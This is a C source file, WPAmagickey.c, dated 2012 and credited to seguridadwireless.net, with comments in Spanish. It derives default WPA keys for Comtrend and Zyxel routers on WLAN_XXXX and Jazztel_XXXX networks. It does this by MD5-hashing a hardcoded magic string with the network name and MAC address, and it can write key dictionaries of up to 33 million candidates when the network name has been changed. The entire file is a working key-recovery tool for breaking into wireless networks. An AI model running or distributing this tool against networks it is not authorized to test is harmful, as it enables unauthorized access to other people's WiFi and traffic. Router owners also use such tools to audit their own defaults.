/*******************************************************************************
* Fichero:  	WPAmagickey.c
* Autor:	  	www.seguridadwireless.net
* Algoritmo:	Dudux && Mambostar
* Coder:	  	NirozMe|on
* Fecha:	  	31-10-2012
* 
* 
* Descripcion:	Calcula la contraseña WiFi por defecto de una red WLAN_XXXX o 
*	              Jaxxtell_XXXX (WPA). Routers Comtrend (Telefonik & JazzTel)
*			          y Zyxel.
*
* 
* Este programa es software libre; puedes redistribuirlo y/o modificarlo
* bajo los terminos de la Licencia Publica General GNU (GPL) publicada
* por la Free Software Foundation en su version numero 2.
* Mira http://www.fsf.org/copyleft/gpl.txt.
*
* Lo anterior quiere decir que si modificas y/o redistribuyes este codigo o 
* partes del mismo debes hacerlo bajo las mismas condiciones anteriores, 
* incluyendo el codigo fuente modificado y citando a los autores originales.
* 
*
* Este programa se distribuye SIN GARANTIA de ningun tipo. USALO BAJO TU PROPIO
* RIESGO.
*
* 
* Mas informacion en foro.seguridadwireless.net
*
*
* v0.2.4: Nuevo patrón y 512 claves para mac 00:1A:2B, 
*         opcion NOESSID -> 33554432 claves para mac 00:1A:2B (31/10/2012)
* v0.2.3: Añade mac 38:72:C0 y F4:3E:61 (07/09/2011)
* v0.2.2: Añade opcion NOESSID para mac 00:1A:2B diccionario de 16777216 de claves
*		      y opcion -l para listar router/mac soportados 
* v0.2.1: Añade diccionario 256 claves para mac 00:1A:2B (01/09/2011 by Berni69)
* v0.2.0: Añade router Zyxel (15/12/2010)
* v0.1.0: Añade opcion para Essid cambiado (27/11/2010)
* v0.0.2: Añade essid Jazztel (25/11/2010)
* v0.0.1: Version inicial
*******************************************************************************/

//#include <ctype.h>
//#include <stdio.h>
//#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

#define VERSION 0
#define SUBVERSION 2
#define RELEASE 4
#define DATEVERSION "2012/10/31"

//---------------------------
// Variables globales
//---------------------------
FILE *fichero;
char SW[35]="[http://www.seguridadwireless.net]\0";
char appName[12]="WPAmagickey\0";

//------------------------------------------------------------------------------
// Funcion: salirError
// Centraliza mensajes de error y realiza salida controlada
//   Acentos eliminados intencionadamente para no tener
//   que gestionar codificación UTF-8 o ISO-8859-1
//------------------------------------------------------------------------------
void salirError (int errnum)
{
	char *errmsg[8];

	errmsg[0]="Numero invalido de parametros";
	errmsg[1]="Opcion no reconocida";
	errmsg[2]="ESSID no especificado";
	errmsg[3]="ESSID invalido: Se espera WLAN_XXXX, Jazztel_XXXX o NoEssid";
	errmsg[4]="BSSID no especificado";
	errmsg[5]="BSSID invalido: Se espera formato XX:XX:XX:XX:XX:XX";
	errmsg[7]="Error al abrir o crear el fichero";

	if (fichero != NULL) fclose(fichero);

	fprintf(stderr," \033[31m[-Error]\033[0m %s\n\n",errmsg[errnum]);

	exit(errnum);
}

//------------------------------------------------------------------------------
// Funcion: muestraVersion
// Muestra la versión del programa
//------------------------------------------------------------------------------
void muestraVersion(void)
{
 fprintf(stdout,"\n%s v%i.%i.%i (%s) %s\n\n",appName,VERSION,SUBVERSION,RELEASE,DATEVERSION,SW);
}

//------------------------------------------------------------------------------
// Funcion: muestraUso
// Muestra las opciones de uso del programa
//------------------------------------------------------------------------------
void muestraUso(void)
{
 fprintf(stdout, " Algoritmo: Dudu@seguridadwireless.net && Mambostar - Coder: Niroz\n\n");
 fprintf(stdout, " uso: wpamagickey <ESSID> <BSSID> [fichero]\n\n");
 fprintf(stdout, "      wpamagickey -l\n\n");
 fprintf(stdout, " -l : Lista en pantalla Routers conocidos\n\n");
 fprintf(stdout, " <ESSID> = NOESSID para Essid cambiado\n\n");
 fprintf(stdout, " ejemplo: wpamagickey noessid 11:22:33:aa:bb:cc\n");
 fprintf(stdout, " ejemplo: wpamagickey jazztel_1234 aa:bb:cc:dd:ee:ff dicci\n\n");
}

//------------------------------------------------------------------------------
// Funcion: compruebaEssid
// Comprueba que el ESSID sea segun patron WLAN_XXXX, Jazztel_XXXX o NoEssid
//------------------------------------------------------------------------------
void compruebaEssid (char *essid)
{
 unsigned int i;
	
 if (strlen(essid) != 9 & strlen(essid) != 12 & strlen(essid) != 7) salirError(3);
	
 for (i=0;i<strlen(essid);i++) essid[i]=toupper(essid[i]);

 if (strlen(essid) == 9 & strncmp("WLAN_", essid, 5) != 0) salirError(3);
 if (strlen(essid) == 12 & strncmp("JAZZTEL_", essid, 8) != 0) salirError(3);
 if (strlen(essid) == 7 & strncmp("NOESSID", essid, 7) != 0) salirError(3);

 if (strncmp("W", essid, 1) == 0)	i=5;
 if (strncmp("J", essid, 1) == 0)	i=8;

 if (strncmp("NOESSID", essid, 7) != 0){
 	for (i;i<strlen(essid);i++)
		if (!isxdigit(essid[i]))   salirError(3);
  }
}

//------------------------------------------------------------------------------
// Funcion: compruebaBssid
// Comprueba que el BSSID sea de la forma XX:XX:XX:XX:XX:XX
//------------------------------------------------------------------------------
void compruebaBssid (char *bssid)
{
	unsigned int i;

	if (strlen(bssid) != 17) {salirError(5);}

	for (i=0;i<strlen(bssid);i++) {bssid[i]=toupper(bssid[i]);}
 
	for (i=0;i<5;i++) { 
		if (bssid[i*3+2]!=':') {salirError(5);} 
	}

	for (i=0;i<6;i++) {
		if (!isxdigit(bssid[i*3]) || !isxdigit(bssid[i*3+1])) {salirError(5);}
	}
}

//------------------------------------------------------------------------------
// Funcion: calculaHash
// Calcula Hash MD5 del que se obtiene la clave WiFi
//------------------------------------------------------------------------------
unsigned char *calculaHash(char *algoritmo, char *buffer, unsigned int len, int *outlen)
{
	EVP_MD *m;
	EVP_MD_CTX ctx;
	
	unsigned char *hash;
	
	OpenSSL_add_all_digests ();
	
	if (!(m = (EVP_MD*) EVP_get_digestbyname(algoritmo))) return NULL;
	
	if (!(hash = (unsigned char *) malloc(EVP_MAX_MD_SIZE))) return NULL;
	
	EVP_DigestInit(&ctx, m);
	EVP_DigestUpdate(&ctx, buffer, len);
	EVP_DigestFinal(&ctx, hash, outlen);
	
	return hash;
}

//------------------------------------------------------------------------------
// Funcion: montaSemilla
// Prepara cadena a la que calcular el Hash MD5 para obtener la clave/s
//------------------------------------------------------------------------------
void montaSemilla (char semilla[513][33], char *essid, char *bssid, int count, int tipoRouter)
{
	char magicdudux[9]="bcgbghgg\0";
	char bssid1[3][13];
	char bssid2[13];
	char noessid[9]="00000000\0";
	char essid2[5]="0000\0";
	char XX[3]="00\0";

	int i, x, j=0;

	bssid1[0][12]='\0';
	bssid1[1][12]='\0';
	bssid2[12]='\0';


	for (i=0;i<6;i++)			// elimina los : de la bssid
	 {	
		bssid2[j]   = bssid[i*3];
		bssid2[j+1] = bssid[i*3+1];
		j = j+2;
	 }	

	strcpy(bssid1[0],bssid2);	//copia, bssid1[0]=bssid2

// -------------------- preparar datos -----------------------------------------
	if (strncmp("NOESSID", essid, 7) == 0)
	{
		if (tipoRouter == 2) {
		   sprintf(essid2, "%04X",count);	//convert int count to HEX de 4 cifras
                        		          //count pasa a ser el essid
		}
		else {
		   strcpy(bssid1[1],bssid2);
		   for (i=8;i<12;i++)   noessid[i-4]=bssid1[0][i];	// copia ultimas 4 cifras mac
		   x = strtol(noessid,NULL,16);					// convert to int

		   for (j=1; j<4; j+=2) {						// para restar 1 y 3
			sprintf(noessid, "%08X",x-j);					// convert int to HEX
 			for (i=6;i<8;i++) {bssid1[j/3][i+4]=noessid[i];}	// 2 ultimas cifras mac
		   }
		   bssid1[2][0]='\0';
		}
	}
	else {
		if (strncmp("W", essid, 1) == 0)	//WLAN_YYYY, BSSID: AA:BB:CC:DD:EE:FF
		{
			for (i=5;i<strlen(essid);i++) { 
			  bssid1[0][i+3]= essid[i];		//AABBCCDDYYYY
			  essid2[i-5]= essid[i];			//YYYY
			}
			bssid1[1][0]='\0';
		}
		
		if (strncmp("J", essid, 1) == 0)	//JAZZTEL_YYYY
		{
			for (i=8;i<strlen(essid);i++) { 
			  bssid1[0][i]= essid[i];		//AABBCCDDYYYY
			  essid2[i-8]= essid[i]; 		//YYYY
			}
			bssid1[1][0]='\0';
		}
	}

// ------------------- montar semilla segun tipo de router ---------------------
	switch (tipoRouter)		// ESSID: WLAN_YYYY - BSSID: AA:BB:CC:DD:EE:FF
	{
	  case 0:				//tipoRouter=0 -> bcgbghggAABBCCDDYYYYAABBCCDDEEFF
			j=0;
			do {
				strcpy(semilla[j],magicdudux);	//bcgbghgg
				strcat(semilla[j],bssid1[j]);		//AABBCCDDYYYY
				strcat(semilla[j],bssid2);		//AABBCCDDEEFF
				j++;
			} while	(bssid1[j][0]!='\0');

			semilla[j][0]='\0';
			break;

	  case 1:				//tipoRouter=1 -> aabbccddyyyy
			j=0;
			do {
				semilla[j][0]='\0';
				for (i=0;i<strlen(bssid1[j]);i++) {
				   bssid1[j][i]=tolower(bssid1[j][i]);
				}
				strcat(semilla[j],bssid1[j]);
				j++;
			} while	(bssid1[j][0]!='\0');

			semilla[j][0]='\0';
			break;

	  case 2:				//tipoRouter=2 -> bcgbghgg64680CXXYYYYAABBCCDDEEFF || 
	                //                bcgbghgg3872C0XXYYYYAABBCCDDEEFF
			for (j=0; j<512; j++) {
	 	    strcpy(semilla[j],magicdudux);
			  
			  if (j<256)  {
				strcat(semilla[j],"64680C\0");
				sprintf (XX, "%02X",j);
			 	}
			  else {
				strcat(semilla[j],"3872C0\0");
				sprintf (XX, "%02X",j-256);
			  }
			  
			  strcat(semilla[j],XX);
			  strcat(semilla[j],essid2); //YYYY
			  strcat(semilla[j],bssid2); //AABBCCDDEEFF
			}
			semilla[j][0]='\0';
			break;
	}//switch
}

//------------------------------------------------------------------------------
// Funcion: detectRouter
// Detecta con que Router/mac vamos a trabajar.
//------------------------------------------------------------------------------
int detectRouter(char *bssid)
{
	if (strncmp("00:1F:A4",bssid,8) == 0 || strncmp("F4:3E:61",bssid,8) == 0) { return 1; }

	if (strncmp("00:1A:2B", bssid, 8) == 0) { return 2; }
		else { return 0; }
}

//------------------------------------------------------------------------------
// Funcion: escribePass
// Calcula y Escribe la clave en pantalla y/o fichero
//------------------------------------------------------------------------------
void escribePass(char semilla[513][33], FILE *fichero, int tipoRouter)
{
	int i, ii=0, outlen;
	unsigned char *clave;

	while (semilla[ii][0] != '\0') {

		clave = calculaHash("md5", semilla[ii], strlen(semilla[ii]), &outlen);

		if (!tipoRouter || tipoRouter == 2) {
		   for(i=0;i<10;i++) {
			fprintf(fichero,"%02x",(unsigned char)(clave[i]&0xFF)); }
		  }
		else {
			for(i=0;i<10;i++)
				fprintf(fichero,"%02X",(unsigned char)(clave[i]&0xFF));
	  	}

		ii++;
		fprintf(fichero,"\n");

		free(clave);  // liberar la memoria del puntero es bien
	}	
}

//------------------------------------------------------------------------------
// Funcion: listaRouter
// Lista por pantalla los router conocidos
//------------------------------------------------------------------------------
void listaRouter(void)
{
	fprintf(stdout," COMTREND \t00:1A:2B:XX:XX:XX\n");
	fprintf(stdout," COMTREND \t00:1D:20:XX:XX:XX\n");
	fprintf(stdout," COMTREND \t38:72:C0:XX:XX:XX\n");
	fprintf(stdout," COMTREND \t64:68:0C:XX:XX:XX\n");
	fprintf(stdout," ZYXEL \t\t00:1F:A4:XX:XX:XX\n");
	fprintf(stdout," ZYXEL \t\tF4:3E:61:XX:XX:XX\n\n");

	fprintf(stdout," Nota:\tmac/s no incluidas en esta lista se trataran por\n");
	fprintf(stdout,"\tdefecto igual que si fueran de tipo 64:68:0C\n\n");

	exit(0);
}

//------------------------------------------------------------------------------
// Programa principal
//------------------------------------------------------------------------------
int main(int argc, char *argv[])
{
	char semilla[513][33];
	int n=0, count=0, tipoRouter=0, cursor_pos=0;

	muestraVersion();

// ----------------- comprobar opciones de entrada -----------------------------
	if (argc > 4)
	{
	  muestraUso();
	  salirError(0);
	  return 1;
	}

	if (argc < 2)
	{
	  muestraUso();
	  return 0;
	}

	if ( argc == 2 ) {	//comprueba opcion -l
		if (strlen(argv[1]) == 2 && strncmp("-l",argv[1],2) == 0 ) listaRouter();
			else salirError(1);
	} 

	compruebaEssid(argv[1]);
	compruebaBssid(argv[2]);
// ----------------- comprobar opciones de entrada -----------------------------

	fprintf(stdout,"Essid: %s - Bssid: %s \n\n",argv[1],argv[2]);

	tipoRouter = detectRouter(argv[2]);

	montaSemilla(semilla,argv[1],argv[2],count,tipoRouter);

	if (argc == 4) {  //escribir en fichero
	   fichero = fopen(argv[3],"w");
	   if (fichero == NULL) salirError(7);

	   fprintf(stdout,"[+] Generando fichero de claves: %s\n\n", argv[3]);
	   n  = fprintf(fichero,"%s_v%i.%i.%i-%s\n",appName,VERSION,SUBVERSION,RELEASE,SW);
	   n += fprintf(fichero,"Essid:%s-Bssid:%s\n", argv[1], argv[2]);


	   if (tipoRouter == 2 && strncmp("NOESSID", argv[1], 7) == 0) {

		  fprintf(stdout," Esta operacion puede durar unos minutos (Ctrl+c para cancelar)\n\n");
		  fprintf(stdout," Escribiendo claves: \n");

		  for (count=0; count<65536; count++) { //count hará del essid desconocido, maximo 65535=FFFF(Hex)
			 montaSemilla(semilla, argv[1], argv[2], count, tipoRouter);
			 escribePass(semilla,fichero,tipoRouter);
			 fprintf(stdout,"\033[1A\t\t\t%i/33554432\n",(count+1)*512);

  // ---------- divide diccionario en ficheros de 100MB ------------------------
      //if (ftell(fichero)>104857599){ //100MB = 104857600 bytes (1kB=1024 bytes)
        if (ftell(fichero)>99999999){ //100MB = 100000000 bytes (1kB=1000 bytes)
          char fileName[64];
          static char nf[3]="-1\0";

          strcpy(fileName,argv[3]);
          strcat(fileName,nf);

          nf[1]++;

          fclose(fichero);	   
          fichero = fopen(fileName,"w");
        }
  // ---------- divide diccionario en ficheros de 100MB ------------------------
	    }
		  cursor_pos=4;
	   }
	   else {
		  escribePass(semilla,fichero,tipoRouter);
		  count=1;
	   }
	   fclose(fichero);

	// -------------numero claves calculadas y tamaño en disco -------------------
	  if (tipoRouter == 2) {
	   float size;		//65536*512 claves * 21 bytes/clave
	   size = ( ((count*512*21) + n) / 1000.0 );  //1kB=1000bytes
	   if (size<1000) {
			fprintf(stdout,"\n\033[%iA Calculadas %i claves (%.1f kB)",cursor_pos,count*512,size);
			fprintf(stdout,"                                 \n");
		 }
	   else {
			fprintf(stdout,"\n\033[4A Calculadas %i claves (%.1f MB)",count*512,size/1000.0);
			fprintf(stdout,"                                 \n");
		 }
	  }
	// -------------numero claves calculadas y tamaño en disco -------------------

	 fprintf(stdout,"\n[+] Fichero guardado OK                        \n\n");
	}
	else {  //escribir en pantalla
	   if (tipoRouter == 2 && strncmp("NOESSID", argv[1], 7) == 0) {
		  for (count=0; count<65536; count++) {
			montaSemilla(semilla, argv[1], argv[2], count, tipoRouter);
			escribePass(semilla,stdout,tipoRouter);
	      }
	   }
	   else {
		  fprintf(stdout,"Clave/s: \n");
		  escribePass(semilla,stdout,tipoRouter);
		  fprintf(stdout,"\n");
	   }
	}

	return 0;
}
//----------------------------- created with gedit ;) ---------------------- EoF
